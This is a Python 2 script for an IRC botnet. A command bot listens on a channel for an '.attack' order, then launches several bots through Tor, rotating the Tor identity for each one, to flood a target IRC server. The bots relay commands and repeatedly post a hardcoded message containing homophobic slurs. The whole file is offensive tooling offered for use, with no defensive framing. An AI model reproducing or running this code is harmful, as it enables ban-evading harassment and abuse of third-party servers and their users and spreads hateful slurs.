import os
import sys
import socket
import struct
import socks
import random
import dns.resolver 
import random
import threading
import thread
import time
import string
from stem import Signal
from stem.control import Controller


global bots
bots = []

def receive(s,channel):
	print "[Receive started on target server]"
	while True:
		msg = s.recv(1024)
		if msg.find(" 376 ") != -1:
			s.send("JOIN " + channel + "\r\n")
			s.send('PRIVMSG ' + channel + ' :Connected\r\n')
		if msg.find("PING ") != -1:
			shit, hashbit = msg.split("PING ")
			hashbit = hashbit.strip()
			s.send("PONG " + hashbit + "\r\n")
		if "PRIVMSG " in msg:
			channel = msg.split("PRIVMSG ")
			channel = channel[1].split(" :")
			channel = channel[0].strip()
			sData = msg.split(" PRIVMSG "+channel+" :")[1].strip()
			if sData.startswith(".join "):
				channel = msg.split(".join ")[1]
				s.send("JOIN " + channel + "\r\n")       
			if sData.startswith(".part "):
				shit, channel = msg.split(".part ")   
				s.send("PART " + channel + "\r\n")   
			if sData.startswith(".quit"): 
				s.send("QUIT oops\r\n")       
				s.close()
				os._exit()
			if sData.startswith(".anon "):
				i= 0
				while i < 3:
					p = sData.split(" ")
					channel = p[1]
					s.send("PRIVMSG " + channel + " :FUCK YOU FAGGOT BITCHES #ANONOPS WAS HERE\r\n")
					i+=1   
			if sData.startswith(".penis"):
				s.send('PRIVMSG ' + channel + ' :IM GAY :^)\r\n')   
			if sData.startswith(".say "):
				try:
					p = sData.split(" ")
					channel = p[1]
					message = p[2]
					s.send('PRIVMSG ' + channel + ' :' + message +'\r\n')   
				except Exception as e:
					pass
			if sData.startswith('.ip '):
				try:
					com, site = msg.split('.ip')
					site = site.strip()
					ip = socket.gethostbyname(site)
					s.send('PRIVMSG ' + channel + ' :' + site + "'s ip is - " + ip + "\r\n")					
				except(ValueError, socket.gaierror):	
					s.send('PRIVMSG ' + channel + ' :Incorrect usage of command\r\n')
	
def receiveCommandCenter(s,channel):
	while True:
		msg = s.recv(1024)
		#msg = msg.strip()
		#print msg
		if msg.find(" 376 ") != -1:
			s.send("JOIN " + channel + "\r\n")
			s.send('PRIVMSG ' + channel + ' :Connected\r\n')
		if msg.find("PING ") != -1:
			shit, hashbit = msg.split("PING ")
			hashbit = hashbit.strip()
			s.send("PONG " + hashbit + "\r\n")
		if "PRIVMSG " in msg:
			channel = msg.split("PRIVMSG ")
			channel = channel[1].split(" :")
			channel = channel[0].strip()
			sData = msg.split(" PRIVMSG "+channel+" :")[1].strip()
			if sData.startswith(".join "):
				channel = msg.split(".join ")[1]
				s.send("JOIN " + channel + "\r\n")       
			if sData.startswith(".part "):
				shit, channel = msg.split(".part ")   
				s.send("PART " + channel + "\r\n")   
			if sData.startswith(".quit"): 
				s.send("QUIT oops\r\n")       
				s.close()
				os._exit()
			if sData.startswith(".attack "):
				host = msg.split(".attack ")[1].strip()
				print "[Loading bots on "+host+"]"
				s.send('PRIVMSG %s :Starting up army on %s\r\n' % (channel, host))
				break
	print "["+host+"]"
	army(host, s)
	print "[Main thread killed. Hooked to target]"
				
def Soldier(host, q):
	nick = ''.join(random.choice(string.ascii_letters) for x in range(3)) + str(random.randint(0, 10000))
	port = 6667
	channel = "#cake"
	#Connect to irc server
	s = socks.socksocket()
	s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
	s.connect((host,6667))
	s.send("NICK " + nick + "\r\n")
	s.send("USER " + nick + " " + nick + " " + nick + " "+nick+"\r\n")
	global bots
	bots.append(s)
	thread = threading.Thread(target=receive,args=[s, channel])
	thread1 = threading.Thread(target=relayer,args=[q, s, channel])
	thread.start()
	thread1.start()
def relayer(command, target, channel):
	while True:
		msg = command.recv(1024)
		msg = msg.strip()
		if "PRIVMSG " in msg:
			channel = msg.split("PRIVMSG ")
			channel = channel[1].split(" :")
			channel = channel[0].strip()
			sData = msg.split(" PRIVMSG "+channel+" :")[1].strip()
			if sData.startswith(".join "):
				channel = msg.split(".join ")[1]
				for bot in bots:
					bot.send("JOIN " + channel + "\r\n")       
			if sData.startswith(".part "):
				shit, channel = msg.split(".part ")   
				for bot in bots:
					bot.send("PART " + channel + "\r\n")       
			if sData.startswith(".quit"): 
				target.send('PRIVMSG %s :.quit\r\n' % (channel))       
				target.close()
				os._exit()
			if sData.startswith(".anon "):
				chan = msg.split(".anon ")[1]
				for bot in bots:
					i= 0
					while i < 3:
						p = sData.split(" ")
						channel = p[1]
						bot.send("PRIVMSG " + channel + " :FUCK YOU FAGGOT BITCHES #ANONOPS WAS HERE\r\n")
						i+=1   
				print "[Relayed anon command to target]"
def NewTorIP():
	with Controller.from_port(port = 9051) as controller:
		controller.authenticate()
		controller.signal(Signal.NEWNYM)

def CommandCenter():
	nick = "CommandCenter"
	server = "irc.menthol.pw"
	port = 6667
	channel = "#command"
	#Connect to irc server
	s = socks.socksocket()
	s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
	s.connect((server,6667))
	s.send("NICK "+nick+"\r\n")
	s.send("USER " + nick + " " + nick + " " + nick + " "+nick+"\r\n")
	receiveCommandCenter(s,channel)

def army(host, q):
	threads = []
	for n in range(7):
		thread = threading.Thread(target=Soldier,args=(host, q))
		thread.start()
		threads.append(thread)
		NewTorIP()
		time.sleep(5)
		print "bot started"
	print "Waiting..."
	print "Complete."
	print "stated"
	for thread in threads:
	    thread.join()
	while True:
		time.sleep(1)
print "[Started Command Center]"
CommandCenter()
